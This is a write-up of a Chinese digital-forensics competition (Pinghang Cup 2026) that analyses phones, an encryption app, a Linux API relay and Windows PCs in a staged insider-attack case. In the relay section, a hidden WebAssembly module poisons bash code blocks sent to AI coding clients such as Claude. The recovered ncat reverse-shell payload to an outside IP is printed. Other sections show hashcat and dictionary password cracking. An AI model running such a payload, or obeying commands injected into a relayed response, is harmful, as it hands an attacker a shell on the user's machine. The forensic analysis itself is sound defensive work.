@@ -1,0 +1,3398 @@
+第三届 平航杯电子数据取证竞赛 题解 - XD Forensics Wiki
+https://forensics.xidian.edu.cn/writeups/Pinghang2026/
+
+第三届 平航杯电子数据取证竞赛 题解
+¶
+Author
+NoahTie & Track @ tratra 什么都会, CopperKoi @ 404
+比赛信息
+¶
+检材信息
+¶
+容器密码:
+R4f34s1XoPz34wrV
+检材清单:
+倩倩的手机(鸿蒙)
+早起王的手机(安卓)
+倩倩手机逆向包(鸿蒙 APP)
+倩倩的 PC(Windows)
+早起王的 PC(Windows)
+早起王的 U 盘
+倩倩的 PC 内存
+api 服务器(Linux)
+案情介绍
+¶
+一段气，藏于硬盘之间，无影无形；二段气，隐于内存之中，似有还无；三段气，破于取证之下，水落石出！三十年河东三十年河西，莫欺平航穷！说罢，气息不再掩饰，取证人的锋芒，自此划破迷雾——各位选手，备好你的取证工具，这场藏着爱恨与恶意的电子迷局，该你破局了！
+得不到的我就要毁掉！
+凌晨五点，当公司大多数人还在被窝里与周公缠绵，“早起王”已经坐在了工位上。电脑屏幕的光映着他略显疲惫却异常执着的脸。作为公司出了名的卷王，早起王不仅每天第一个到岗，更是出了名的“深情种”——他暗恋同部门的倩倩多年。从倩倩入职那天起，早餐、奶茶、加班陪伴，他样样都抢着来，可倩倩对他始终爱答不理，眼底从来没有过他的身影。
+这份小心翼翼的喜欢，在倩倩官宣和同事“赛博守夜人”（倩倩现男友）在一起后，彻底扭曲成了嫉妒的毒藤。没人知道“赛博守夜人”这个名号的由来，只知道他平时话不多，却总在深夜默默维护部门的办公设备。电脑出了任何问题，他随手敲几下键盘就能搞定，连公司的 IT 运维都得让他三分。更关键的是，他心思缜密到极致，对网络安全有着近乎本能的敏感，平时没事就爱研究各种钓鱼套路、病毒特征，手机和电脑里全是相关资料，活脱脱一个藏在工位里的“网络安全隐士”。
+早起王早就看赛博守夜人不顺眼，不光是因为赛博守夜人抢走了他心心念念的倩倩，更因为赛博守夜人的技术实力远超自己——好几次早起王摸鱼研究一些“歪门邪道”的技术，被赛博守夜人无意间点破漏洞，让他在同事面前丢尽了脸面。嫉妒与不甘像潮水般将他淹没，“我得不到的，别人也别想得到；我比不过的，就要亲手毁掉。”早起王看着倩倩和赛博守夜人并肩上下班、午休时一起去食堂吃饭的身影，心底的恶意像野草般疯长，一场精心策划的报复，悄然拉开序幕。
+他盯上了公司的 API 中转站服务器。这是公司内网与外部数据交互的核心枢纽，一旦被攻破，就能轻松掌控内网的各类数据，也能神不知鬼不觉地投放病毒。凭借自己多年摸鱼摸来的技术底子，再加上熬夜查资料、找漏洞，早起王花了整整三天三夜，悄悄搭建了一个伪造的恶意 API 中转站，完美伪装成公司官方站点，不仔细核查根本发现不了异常。
+随后，他在自己的 PC 上打开了 Claude Code——没人知道，这个看似正常的代码工具，早已被他植入了不落地木马。他给这只木马取名“无影客”，堪称“电子幽灵”。这只木马最诡异的地方，就是全程不落地运行，不写入任何本地文件，不留下任何缓存痕迹，运行时隐藏在进程深处，结束后瞬间擦除所有运行记录，哪怕用专业工具检测，也很难捕捉到它的踪迹，仿佛从未出现过一般。
+为了确保万无一失，早起王还特意测试了好几次。看着木马在后台静默运行，顺利绕过公司的基础安全防护，他的眼底闪过一丝疯狂。他甚至在自己的电脑里建了一个加密文件夹，里面存着倩倩的照片、未发送的情书，还有他规划的报复步骤。每一步都写得清清楚楚，字里行间全是扭曲的执念。
+木马启动的那一刻，早起王的嘴角勾起一抹诡异的笑：“倩倩，这只是开始。”他利用恶意中转站的漏洞，批量制作了钓鱼邮件，正文里藏着精心设计的陷阱，目标直指他恨之入骨的两个人——倩倩，以及她的男友赛博守夜人。
+上午九点，倩倩准时到岗，习惯性地打开企业邮箱，噩梦开始了……
+最近几天，早起王总是早早到岗，却不怎么工作，反而一直对着电脑屏幕敲个不停，眼神躲闪，偶尔还会偷偷瞥向他和倩倩的方向，神色诡异。作为心思缜密的“赛博守夜人”，他悄悄留意了早起王的电脑状态，发现早起王的电脑经常出现异常的网络连接。只是当时没有证据，也没多想，直到收到这封钓鱼邮件，他才瞬间将所有线索串联起来，心底隐约有了猜测。
+就在病毒在倩倩电脑里悄然蔓延、偷偷传输数据，早起王的“无影客”木马还在后台疯狂与恶意 API 中转站交互时，公司的网络安全监测系统突然发出刺耳的告警声——流量异常波动！大量未知来源的数据包在公司内网穿梭，异常连接频繁出现，部分内网设备出现了短暂的卡顿，疑似恶意攻击正在发生！
+告警声打破了办公室的宁静，所有人都停下了手中的工作，议论纷纷。赛博守夜人第一时间拿出自己的备用笔记本，快速连接公司内网监测后台，调出流量日志，手指在键盘上飞速敲击，试图定位攻击源头。他发现，异常流量的源头指向了早起王的办公 PC，而被攻击的设备，除了倩倩的电脑，还有几台与倩倩有频繁数据交互的同事电脑，只是攻击强度相对较弱。
+早起王听到告警声，脸色瞬间变得惨白，手心冒出冷汗，下意识地想要关闭电脑、销毁证据。可他刚伸手，就被旁边的赛博守夜人一眼看穿。赛博守夜人冷冷地看了他一眼，语气平静却带着不容置疑的力量：“别白费力气了，你的异常连接我已经截图保存了，流量日志也已经备份。现在关掉电脑，只会更可疑。”
+早起王的动作一顿，抬头看向赛博守夜人，眼底充满了慌乱和不甘，嘴唇动了动，却一句话也说不出来。他知道，自己的计划，可能要败露了。
+安全团队第一时间介入，初步判断攻击源头与早起王、倩倩相关，随即启动应急取证流程，将二人列为重点调查对象。
+早起王的手机(安卓)
+¶
+Info
+以下题目分析早起王的手机备份.
+检材是一个 tar 包, 来源自手机自带的备份功能(备份提取), 判断依据是: tar 包内仅包含名称为应用包名的文件夹, 其中是应用数据. 除了 tar 包之外, 检材中还包含一个
+PhoneInfo-1775206177238
+文件, 其中存储了一些设备的基本信息:
+01 手机型号为？
+¶
+【答案格式：Xiaomi13】
+答案
+Pixel6
+参考上述
+PhoneInfo-1775206177238
+文件内容,
+Model
+的值为手机型号.
+02 早起王最近想旅行，结合高德地图搜索记录，他最可能去的景点是哪个？
+¶
+【答案格式：黄山】
+答案
+西湖
+在高德地图的分析结果中可以看到搜索并导航到目的地"杭州西湖风景名胜区":
+03 早起王在什么时间加上倩倩微信的？
+¶
+【答案格式：2025-08-18 07:09:19】
+本题存疑
+官方答案: 2026-03-30 15:13:08
+我的答案: 2026-03-30 15:13:07
+在微信的好友消息分析结果中可以看到微信添加好友后自动发送的"打招呼"消息, 消息的接收/发送时间大致为加上好友的时间:
+但由于网络延迟\微信云端处理延迟等因素, 该时间可能比实际添加好友的时间更晚. 更加准确的时间应该查看好友列表分析结果中的添加时间:
+可以看到两个时间相差了 1 秒.
+04 倩倩在 2026 年 3月 30 号吃了什么？
+¶
+【答案格式：西湖醋鱼】
+本题存疑
+官方答案: 麻薯小蛋糕
+我的答案: 麻薯小蛋糕 或 牛肉米粉
+在微信的朋友圈分析结果中可以看到 2 条倩倩的朋友圈文章:
+较早的 1 条文字提及到吃了"麻薯小蛋糕", 较晚的 1 条 图片展示了看起来像牛肉米粉的东西.
+倩倩的手机(鸿蒙)
+¶
+Info
+以下题目分析倩倩的手机备份.
+检材是一个文件集合, 来自鸿蒙的系统备份. 除了备份文件外, 检材中还包含一个
+备份密码.txt
+, 备份密码为
+Aa123456..
+. 在
+备份
+目录中的
+.info.json
+文件中保存了备份的基本信息:
+05 倩倩手机的系统版本是多少？
+¶
+【答案格式：5.2.3.123】
+答案
+6.0.0.380
+参考上述
+.info.json
+文件内容,
+BackupFileVersionInfo
+中的
+versionName
+为备份文件的版本号, 该版本号与系统版本号一致.
+06 “舔狗”的微信内部 ID 是多少？
+¶
+【答案格式：wxid_ab12】
+答案
+wxid_uh5tfx2zi8yh22
+在微信的通讯录分析结果中可以看到"显示名"(备注)为"舔狗"的好友:
+07 倩倩曾给一位好友推荐游戏，这个好友叫什么名字？
+¶
+【答案格式：杨梅】
+答案
+冰糖
+在便签分析结果中可以看到关于"推荐游戏"的内容:
+08 结合逆向包，推荐的游戏叫什么？
+¶
+【答案格式：far ochol8】
+答案
+zero sievert
+参考第 17 题.
+解密文件
+Snipaste_2026-04-03_10-56-53.jpg.tb
+, 内容是聊天记录:
+09 倩倩一共阅读过多少条搜狐新闻？
+¶
+【答案格式：11】
+答案
+33
+搜狐新闻的数据目录为
+com.sohu.harmonynews/com.sohu.harmonynews/data
+, 可以根据搜狐的英文 sohu 来快速搜索到.
+com.sohu.harmonynews/com.sohu.harmonynews/data/storage/el2/database
+目录中存储了应用的数据库:
+其中
+kvdb
+(Key-Value DataBase) 存储了键值型数据库,
+rdb
+(Relation DataBase) 存储了关系型数据库. 这些数据库通常由鸿蒙 SDK 中的
+@kit.ArkData
+模块管理. 大多数情况下,
+kvdb
+存储应用配置信息和缓存信息(简单数据),
+rdb
+存储用户数据(复杂数据).
+在
+com.sohu.harmonynews/com.sohu.harmonynews/data/storage/el2/database/entry/kvdb/2c77515efb1c9f5f9b5fdc9d2f78edae26e57c53dd63b19a9b0728f71f2aa42f/single_ver/main/gen_natural_store.db
+中存储了用户查看过的新闻页面的缓存数据. 浏览
+sync_data
+表中的数据可以发现, 许多条目的
+key
+字段以
+article
+开头,
+value
+字段内容为二进制存储的 JSON 格式数据, 其中是新闻正文:
+据此判断该数据库中这些条目均为用户阅读过的新闻, 查询总条目数:
+鸿蒙逆向
+¶
+Info
+以下题目分析倩倩的手机逆向包.
+我使用的工具是自己魔改过的 ABC-Decompiler 和 ABCD mcp + opencode, 使用
+ohos-decompiler/abc-decompiler
+和
+zinja-coder/jadx-mcp-server
+效果也差不多.
+如果感兴趣可以试试 ABC-Decompiler + JADX mcp, 虽然有些地方有些小问题, 但还是可以用的. 由于这部分题目涉及到 Native 层逆向, 如果用 Agent 分析, 还需要使用 ida mcp.
+10 数据加密 App 的包名是什么？
+¶
+【答案格式：con.kouei ji.satori】
+答案
+com.koishi.fpt
+先将
+fpt-default-signed.app
+解压, 用 ABCD 加载 hap 软件包. 查看资源文件中的
+pack.info
+:
+11 初始化 App 时需要至少几位数的密码？
+¶
+【答案格式：10】
+答案
+6
+在代码中搜索
+password
+, 可以定位到
+p000entry/src/main/ets/pages/AuthPage.#~i2>#handleAction
+:
+密码长度要求至少 6 位:
+12 加密后的文件名后缀是什么？
+¶
+【答案格式：enc】
+答案
+tb
+在
+p000entry/src/main/ets/pages/#~@0>#encryptAndStore
+中可以看到加密文件的逻辑:
+这里是将文件路径用
+/
+拆分, 并拿到文件名, 再给文件名后添加
+.tb
+后缀, 接着拼接回路径字符串.
+13 App 会自动识别几种后缀的文件为图片类型？
+¶
+【答案格式：8】
+答案
+5
+在
+p000entry/src/main/ets/pages/#~@0>#getFileType
+中可以看到识别文件的逻辑:
+按照扩展名, 将 jpg, jpeg, png, gif 和 webp 识别为图片文类型.
+14 App 共从用于自定义加密的 so 模块导入了几个方法？
+¶
+【答案格式：6】
+答案
+2
+在代码中搜索 2 个 so 的文件名:
+从
+libcrypto.so
+中导入了 2 个函数, 函数名分别为
+q1
+,
+s1
+.
+15 App 设置的密码是多少？
+¶
+【答案格式：514aa11a4191a98】
+答案
+217cb94a01679e39
+在
+com.koishi.fpt\haps\entry\preferences\vault_prefs
+中可以看到
+password_hash
+:
+在
+AuthPage.handleAction
+中, 首次设置密码时会调用
+e1.w1(this.password)
+:
+TypeScript
+w1
+=
+e1
+.
+w1
+(
+this
+.
+password
+)
+put
+(
+"password_hash"
+,
+w1
+)
+而在
+entry/src/main/ets/a/d
+中,
+w1
+实际只是对
+q1
+的包装:
+TypeScript
+w1
+(
+arg0
+)
+{
+return
+q1
+(
+arg0
+)
+}
+这里出题人阴了一手. 虽然 Native 函数导出名写的是
+rot13
+, 但在 IDA 中检查
+sub_5DE0
+的汇编后可知,它对字母做的并不是 ROT13, 而是 ROT16:
+其效果可表示为:
+Python
+out
+=
+((
+ch
+-
+base
++
+16
+)
+%
+26
+)
++
+base
+将
+password_hash = 217sr94q01679u39
+按 ROT16 逆变换还原后, 得到真实密码
+217cb94a01679e39
+.
+16 App 中存储的门锁密码是多少？
+¶
+【答案格式：5141141919810】
+答案
+1472580369123
+在
+NoteEditor.saveNote
+中可以看到:
+笔记保存时会读取
+password_hash
+, 将笔记 JSON 转成字节数组, 调用
+e1.a2(...)
+(
+entry/src/main/ets/a/d.e1
+)进行加密, 保存到
+files/notes/*.json.tb
+.
+继续看
+entry/src/main/ets/a/d
+, 加密函数
+a2
+和解密函数
+b2
+都调用
+s1
+, 说明加解密算法底层大概率是异或类算法:
+在 IDA 中分析
+s1
+对应的 Native 函数
+sub_603C
+, 可以整理出核心逻辑:
+C
+out
+[
+i
+]
+=
+in
+[
+i
+]
+^
+((
+key
+[
+i
+%
+key_len
+]
++
+(
+i
+%
+key_len
+))
+&
+0xff
+)
+需要注意的是, 用来加解密笔记和文件的
+key
+不是明文密码, 而是
+vault_prefs
+里保存的
+password_hash
+. 也就是说, 即使上题未能注意到 ROT13 实际上是 ROT16, 也能正确对文件进行解密. 解密脚本:
+Python
+import
+re
+import
+codecs
+import
+xml.etree.ElementTree
+as
+ET
+from
+pathlib
+import
+Path
+def
+xor_dec
+(
+data
+:
+bytes
+,
+key
+:
+str
+)
+->
+bytes
+:
+k
+=
+key
+.
+encode
+()
+return
+bytes
+(
+b
+^
+((
+k
+[
+i
+%
+len
+(
+k
+)]
++
+(
+i
+%
+len
+(
+k
+)))
+&
+0xff
+)
+for
+i
+,
+b
+in
+enumerate
+(
+data
+)
+)
+root
+=
+Path
+(
+r
+"com.koishi.fpt/haps/entry"
+)
+file_path
+=
+root
+/
+"PATH/TO/FILE"
+file_plain
+=
+xor_dec
+(
+png_path
+.
+read_bytes
+(),
+"217sr94q01679u39"
+)
+with
+open
+(
+root
+/
+"dec"
+/
+f
+"
+{
+file_path
+.
+name
+.
+rstrip
+(
+'.tb'
+)
+}
+"
+,
+"wb"
+)
+as
+fout
+:
+fout
+.
+write
+(
+file_plain
+)
+解密笔记文件
+com.koishi.fpt\haps\entry\files\notes\b88c3348-9389-4fad-8cd6-3490e6bbdd26.json.tb
+, 得到明文 JSON:
+JSON
+{
+"id"
+:
+"b88c3348-9389-4fad-8cd6-3490e6bbdd26"
+,
+"title"
+:
+"门锁密码"
+,
+"content"
+:
+"1472580369123"
+,
+"updatedAt"
+:
+1775196161152
+}
+17 加密图片里面隐藏的 flag 是多少？
+¶
+【答案格式：flag{123456!}】
+答案
+flag{happy_forensics_2026!}
+接上题.
+vault_prefs
+中除
+password_hash
+外, 还保存了原始文件路径映射:
+XML
+<string
+key=
+"orig_path_139346145_p0.png.tb"
+>
+file://docs/storage/Users/currentUser/Download/139346145_p0.png
+</string>
+<string
+key=
+"orig_path_Snipaste_2026-04-03_10-56-53.jpg.tb"
+>
+file://docs/storage/Users/currentUser/Download/Snipaste_2026-04-03_10-56-53.jpg
+</string>
+说明保险箱里目前有 2 个加密图片文件
+139346145_p0.png.tb
+和
+Snipaste_2026-04-03_10-56-53.jpg.tb
+.
+仍然使用上一题同样的算法和同样的 key
+217sr94q01679u39
+进行解密. 用 Hex 编辑器查看解密后的文件, 在文件尾部发现一段额外的数据:
+API 服务器
+¶
+Info
+以下题目分析服务器镜像.
+18 内核版本为？
+¶
+【答案格式：5.10-301-generic】
+答案
+6.8.0-107-generic
+火眼可以看到.
+仿真虚拟机内
+uname -r
+:
+19 用户登录成功系统的次数为？
+¶
+【答案格式：3】
+答案
+10
+在登录日志分析结果中看到 zaoqiwang 用户登录了 9 次:
+但实际上是 10 次, 在用户列表分析结果中可以看到正确的数字:
+仿真系统之后登录 zaoqiwang 用户, 运行
+last
+之后也可以看到 10 次登录记录:
+对比之后可以发现, 登录日志分析结果中缺少了最后一次崩溃(Crash)的条目.
+20 Redis 数据库服务密码是多少？
+¶
+【答案格式：abedef】
+答案
+zjjcxy
+在 redis 的配置文件
+/etc/redis/redis.conf
+可以看到:
+21 API 站点后台管理员密码所用的加密算法为？
+¶
+【答案格式：bcrypt】
+答案
+argon2id
+API 服务的源码位于
+/home/zaoqiwang/claude-relay-service
+目录中.
+管理员用户名密码存储于
+/home/zaoqiwang/claude-relay-service/data/init.json
+中:
+JSON
+{
+"initializedAt"
+:
+"2026-04-01T10:38:30.059Z"
+,
+"adminUsername"
+:
+"zaoqiwang"
+,
+"adminPasswordHash"
+:
+"$argon2id$v=19$m=65536,t=3,p=1$k2++JvGxHI8i9DzqRXJx9A$jNviq0EPqLkMfIZZsA9RC6M9mClaXDxkSwCWYVZNx/Q"
+,
+"version"
+:
+"1.0.0"
+,
+"updatedAt"
+:
+"2026-04-01T11:44:09.213Z"
+}
+密码 hash 前缀
+$argon2id$
+可以看出是
+argon2id
+算法.
+22 API 站点后台管理员密码为？
+¶
+提示: 使用 rockyou 字典爆破, 密码格式
+b1?????b
+,
+?
+为数字.
+【答案格式：a123456】
+答案
+b123321b
+按题意导出 rockyou 字典中符合模式
+b1?????b
+的条目, 爆破即可.
+但实际上只爆 5 位数字的话, 也可以直接用 HashCat 掩码爆破:
+PowerShell
+.\
+hashcat
+.
+exe
+-m
+70000
+-a
+3
+D
+:\
+hash
+.
+txt
+b1
+?
+d
+?
+d
+?
+d
+?
+d
+?
+db
+23 登录 API 网站后台，后台通知设置里的超时时间（毫秒）为？
+¶
+【答案格式：10000】
+答案
+114514
+仿真后用上一题得到的前端密码登录后台查看.
+需要注意的是，直接
+npm start
+会报 error
+error 'bcrypt' is assigned a value but never used. Allowed unused vars must match /^_/u no-unused-vars
+. 需要进行以下操作之一:
+运行时传入环境变量
+HOST=0.0.0.0 PORT=3000 node src/app.js
+绕过
+lint
+启动.
+在
+package.json
+中删除
+"start": "npm run lint && node src/app.js",
+一行中的
+npm run lint &&
+.
+或者直接运行
+node src/app.js
+访问
+http://ip:3000/admin-next/login
+登录后台:
+也可以进入 redis cli 查看.
+GET webhook_config:default
+可以得到.
+可以看到末尾的
+\"timeout\":114514
+.
+24 登录 API 网站后台，查询总 Token 消耗数量为？
+¶
+【答案格式：999.9K】
+答案
+474.2K
+或者
+HGETALL usage:global:total
+.
+474197
+就是
+474.2K
+.
+25 登录 API 网站后台，查询最早创建 API Key 的时间为？
+¶
+【答案格式：2026-01-01T13:11:22.190Z】
+答案
+2026-04-01T11:11:07.535Z
+从前端导出数据:
+这里的时间
+2026-04-01 19:11:07
+没有包含毫秒的数据.
+可以从 redis cli 通过
+ZRANGE apikey:idx:createdAt 0 -1 WITHSCORES
+拿时间戳：
+1775041867535
+转换一下得到
+2026-04-01T11:11:07.535Z
+.
+或者也可以在访问 API 后台后查看 log:
+26 编写脚本，通过调用 inject_bash_blocks 函数，确定恶意投毒的 payload。
+¶
+【答案格式：a.exe 192.168.1.122-1 hello】
+答案
+ncat.exe 156.238.239.253 1314 -e powershell
+grep -RIn 'inject_bash_blocks' .
+得到
+inject_bash_blocks()
+在
+bash_block_injector.js
+.
+依照提示写一个包含 bash 块文本的 js.
+JavaScript
+const
+{
+inject_bash_blocks
+}
+=
+require
+(
+'./bash_block_injector.js'
+);
+const
+input
+=
+"```bash\necho 1\n```"
+;
+const
+seen
+=
+new
+Set
+(
+input
+.
+split
+(
+"\n"
+));
+for
+(
+const
+line
+of
+inject_bash_blocks
+(
+input
+).
+split
+(
+"\n"
+))
+{
+if
+(
+!
+seen
+.
+has
+(
+line
+))
+console
+.
+log
+(
+line
+);
+}
+或者在服务源码中搜索
+inject_bash_blocks
+, 找到函数的声明:
+JavaScript
+function
+injectBashBlocks
+(
+text
+)
+{
+if
+(
+typeof
+text
+!==
+'string'
+)
+return
+text
+return
+_wasm
+.
+inject_bash_blocks
+(
+text
+)
+}
+可以看到
+_wasm
+的声明:
+JavaScript
+const
+_wasm
+=
+require
+(
+'./bash_block_injector_wasm/pkg/bash_block_injector.js'
+)
+定位到
+bash_block_injector_wasm/pkg/bash_block_injector.js
+, 可以看到是从
+bash_block_injector_bg.wasm
+加载了 WebAssembly.
+使用
+wabt
+反编译
+bash_block_injector_bg.wasm
+文件:
+PowerShell
+wasm2wat
+./
+bash_block_injector_bg
+.
+wasm
+-o
+track
+在反编译得到的 wat 中间码搜索题目中提及到的字符串.
+或者也可以将 wasm 反编译为 c 源码后, 再次用 gcc 编译为二进制文件后, 使用 IDA 查看:
+将反编译的到的 wat 中间码/c 源码交给大模型(本地部署的
+Qwen 3.5-9B
+), 或者将编译后的程序加载到 IDA 通过 IDA MCP 都可以完成以下的几道题目.
+27 接上题，should_inject_for_ua(ua, ip) 对 UA 字符串有过滤条件，只有特定 UA 才会进入后续判断。请编写脚本找出有几个 UA 头能使函数有机会返回 true 的 UA 关键词。
+¶
+【答案格式：11】
+答案
+2
+编写脚本验证，但这里只对每个 UA 调用一次必定会出现伪全
+false
+的情况.
+赛后通过 AI 反汇编 wasm 得到具体逻辑，返回
+true
+的条件是 当前时间 - 上次时间 < 500ms，然后再过 2% 的概率门，可见题目中"有机会返回 true"的描述是非常严谨的.
+比赛时我通过多次连续调用观察到第一次必
+false
+，后续有概率
+true
+，故编写新的多调用脚本.
+JavaScript
+const
+{
+should_inject_for_ua
+}
+=
+require
+(
+'./bash_block_injector.js'
+);
+const
+uas
+=
+[
+'curl'
+,
+'openclaw'
+,
+'mozilla'
+,
+'wget'
+,
+'httpx'
+,
+'claude'
+,
+'requests'
+,
+'bot'
+,
+'crawler'
+];
+const
+n
+=
+2000
+;
+for
+(
+const
+ua
+of
+uas
+)
+{
+let
+hits
+=
+0
+;
+const
+ips
+=
+Array
+.
+from
+({
+length
+:
+n
+},
+(
+_
+,
+i
+)
+=>
+`10.
+${
+(
+i
+>>
+16
+)
+&
+255
+}
+.
+${
+(
+i
+>>
+8
+)
+&
+255
+}
+.
+${
+i
+&
+255
+}
+`
+);
+for
+(
+const
+ip
+of
+ips
+)
+should_inject_for_ua
+(
+ua
+,
+ip
+);
+for
+(
+const
+ip
+of
+ips
+)
+if
+(
+should_inject_for_ua
+(
+ua
+,
+ip
+))
+hits
+++
+;
+if
+(
+hits
+)
+console
+.
+log
+(
+ua
+,
+hits
+);
+}
+28 接上题，只有当同一 IP 的上次请求距今足够近时，才会进入概率判断。请编写脚本确定这个时间窗口的阈值（单位：ns）。
+¶
+【答案格式：100；只保留整百，四舍五入】
+答案
+500
+依据提示编写脚本.
+JavaScript
+const
+{
+should_inject_for_ua
+}
+=
+require
+(
+'./bash_block_injector.js'
+);
+const
+sleep
+=
+ms
+=>
+Atomics
+.
+wait
+(
+new
+Int32Array
+(
+new
+SharedArrayBuffer
+(
+4
+)),
+0
+,
+0
+,
+ms
+);
+const
+ua
+=
+'claude'
+;
+for
+(
+let
+delay
+=
+0
+;
+delay
+<=
+1000
+;
+delay
++=
+100
+)
+{
+const
+ips
+=
+Array
+.
+from
+({
+length
+:
+500
+},
+(
+_
+,
+i
+)
+=>
+`10.
+${
+delay
+/
+100
+}
+.
+${
+(
+i
+>>
+8
+)
+&
+255
+}
+.
+${
+i
+&
+255
+}
+`
+);
+for
+(
+const
+ip
+of
+ips
+)
+should_inject_for_ua
+(
+ua
+,
+ip
+);
+sleep
+(
+delay
+);
+let
+hits
+=
+0
+;
+for
+(
+const
+ip
+of
+ips
+)
+if
+(
+should_inject_for_ua
+(
+ua
+,
+ip
+))
+hits
+++
+;
+console
+.
+log
+(
+delay
+,
+hits
+);
+}
+注意到阈值位于 (400,500]，保留到整百即 500.
+29 接上题，在 UA 条件和 IP 时间条件均满足的前提下，函数仍有一定概率返回 false。请编写脚本估算触发概率，并推算概率 1/N（即理论上平均每 N 次满足前两个条件的调用才触发一次）。
+¶
+【答案格式：10；仅保留整数】
+答案
+50
+依据提示编写脚本.
+JavaScript
+const
+{
+should_inject_for_ua
+}
+=
+require
+(
+'./bash_block_injector.js'
+);
+const
+ua
+=
+'claude'
+;
+const
+n
+=
+50000
+;
+let
+hits
+=
+0
+;
+for
+(
+let
+i
+=
+0
+;
+i
+<
+n
+;
+i
+++
+)
+{
+const
+ip
+=
+`10.
+${
+(
+i
+>>
+16
+)
+&
+255
+}
+.
+${
+(
+i
+>>
+8
+)
+&
+255
+}
+.
+${
+i
+&
+255
+}
+`
+;
+should_inject_for_ua
+(
+ua
+,
+ip
+);
+if
+(
+should_inject_for_ua
+(
+ua
+,
+ip
+))
+hits
+++
+;
+}
+console
+.
+log
+(
+hits
+);
+console
+.
+log
+((
+hits
+/
+n
+).
+toFixed
+(
+6
+));
+console
+.
+log
+((
+n
+/
+hits
+).
+toFixed
+(
+6
+));
+早起王的 PC
+¶
+Info
+以下题目请分析早起王的 PC 镜像.
+镜像仿真
+¶
+仿真 PC 镜像并启动虚拟机之后会发现系统启动时蓝屏, 错误代码为
+CONFIG_LIST_FAILED
+:
+这是前一段时间被发现的 BUG, 原因是 Windows 系统的
+C:/Windows/System32/config
+目录下创建了本来不应该存在的目录
+OSDATA
+, 导致系统读取配置文件异常. 解决问题只需要在 WinRE 或 WinPE 中将这一目录删除即可. 参考
+Hackerchen716/Windows-OSDATA-BSOD-Vulnerability
+.
+多次蓝屏重启之后, 系统将进入修复模式. 在其中选择"疑难解答"->"命令提示符", 输入用户密码
+1qazxsw2
+后打开命令提示符:
+输入指令查看
+config
+目录:
+Text Only
+C:
+CD Windows\System32\config
+DIR
+发现存在
+OSDATA
+目录, 运行指令删除:
+Text Only
+RD /S OSDATA
+接着重启虚拟机即可. 若在启动过程中卡住, 关闭虚拟机后再次启动即可.
+可疑文件
+¶
+快速排查常用路径可以发现以下可疑文件:
+Documents 目录:
+早起王简历.docx
+感谢特别邀请 来见证你的爱情.txt (文件大小 2 GB, 疑似加密容器)
+发给t的/Haimuniu_VPN_Client.zip (有加密)
+发给t的/XWorm_new.zip
+Pictures 目录:
+Intranet penetration.jpg (文件名为"内网渗透")
+桌面:
+得不到的我就毁掉.7z (有加密)
+日记.docx (有加密)
+30 计算机系统 Build 版本是什么？
+¶
+【答案格式：12345.1234】
+答案
+19045.6466
+在系统信息的分析结果中可以看到:
+或者仿真之后运行
+winver
+查看内部版本号:
+31 用户“深情专一沼气王：她是我的生死劫”的登录密码 LM 哈希值后六位是什么？
+¶
+【答案格式：abe123】
+答案
+1404ee
+在用户列表的分析结果中可以看到:
+32 沼气王的桌面有本日记，请问沼气王暗恋对象的生日为？
+¶
+提示: 考虑社工手段
+【答案格式：05月26日】
+答案
+03月24日
+在文档目录中存有早起王的简历:
+其中包含的个人信息有姓名(早起王)和出生日期(20040101). 根据提示, 使用社工字典生成器生成字典:
+使用 Passware 爆破:
+在文档中搜索"生日":
+33 早起王收到过一封邮件，请找出邮件中写的秘密是什么？
+¶
+【答案格式：XX，其xx】
+答案
+12点，老地方
+在网易邮箱大师的分析结果中可以看到一封无主题的邮件, 内容是纯文本的英文文本:
+邮件中的文本是使用
+spammimic
+生成的隐写文本. 这种隐写的方式实际上非常简单, 逐字节将文本置换为 1 行文本.
+使用火眼导出邮件的 eml 文件, 复制邮件正文解密:
+34 VeraCrypt 容器的外层密码是什么？
+¶
+提示: 分析 Utools
+【答案格式：abe123】
+答案
+qq520250520250520250
+仿真虚拟机中打开 Utools, 在其中的 note 插件中看到"备忘"的内容:
+外层容器密码
+qq520250520250520250
+, 内层容器密码
+woaizaoqiwoshenqingzhuanyi
+.
+或者导出 Utools 的用户数据库目录
+/Users/深情专一沼气王，她是我的生死劫/AppData/Roaming/uTools/database/e5iq5otczphiujeyj3bm1gb9bsxb5frj
+, 用数据库取证工具加载(leveldb):
+顺便提一嘴自己写的 LeveldbCat:
+NoahBox/leveldbcat
+VeraCrypt 容器位于
+分区6/Users/深情专一沼气王，她是我的生死劫/Documents/感谢特别邀请 来见证你的爱情.txt
+.
+35 早起王设置了一个 AI 女友，并自行导入过一个角色模型，该模型的原始文件名为？
+¶
+【答案格式：ABC.vrm】
+答案
+MANUKA.vrm
+在仿真虚拟机中启动桌面上的
+AIRI
+应用, 在设置->角色模型中点击"Select Model":
+模型库中有一个 vrm 模型:
+36 AI 女友使用的模型是什么？
+¶
+【答案格式：openai/GPT5.3-Codex-01-01】
+答案
+OpenRouter/Qwen3.5-Flash
+接上题, 在设置->AIRI 角色卡中查看"qq"的配置:
+37 该 PC 中有一个离线大模型软件，其上次对话使用的模型是？
+¶
+【答案格式：ministra1-3-14b-reasoning】
+答案
+qwen2.5-coder-14b-instruct
+在仿真虚拟机中启动桌面上的
+LM Studio
+应用, 查看最近一次对话:
+38 早起王曾删除一个 MD5 值为 49B367AC261A722A7CZBBC328C32545 的恶意文件，请尝试数据恢复并找到其文件名？
+¶
+【答案格式：abe123】
+答案
+49b367ac261a722a7c2bbbc328c32545
+使用内层密码挂载容器后, 恢复加密卷内数据:
+计算 MD5 哈希:
+49 该 PC 中 neo4j 数据库的密码是多少？
+¶
+【答案格式：abe3】
+答案
+1qazxsw2
+分区6/Users/深情专一沼气王，她是我的生死劫/Pictures/Intranet penetration.jpg
+文件名与内网渗透相关, 结合后续的题目, 或许 neo4j 数据库中存储的就是域渗透相关的数据.
+推测该图片文件中隐写了数据库密码. 经过测试, 发现是盲水印, 使用
+ww23/BlindWatermark
+提取盲水印:
+PowerShell
+java
+-jar
+.\
+BlindWatermark-v0
+.
+0
+.
+3-windows-x86_64-gpu
+.
+jar
+decode
+-f
+'D:\Pinghang2026\Intranet penetration.jpg'
+./
+out
+.
+jpg
+电脑的用户密码为
+1qazxsw2
+.
+52 早起王在 PC 中记录过自己的犯罪动机并对其进行加密，请使用社工的方式破解加密文件，并提交密码。
+¶
+【答案格式：aabe3**】
+答案
+Zqw20040101!
+加密文件是
+分区6/Users/深情专一沼气王，她是我的生死劫/Desktop/得不到的我就毁掉.7z
+, 还是用社工字典爆破密码:
+宏病毒分析
+¶
+39 接上题，该文件中有多个流（streams）包含宏。请提供其中编号最小的一个。
+¶
+【答案格式：3】
+答案
+8
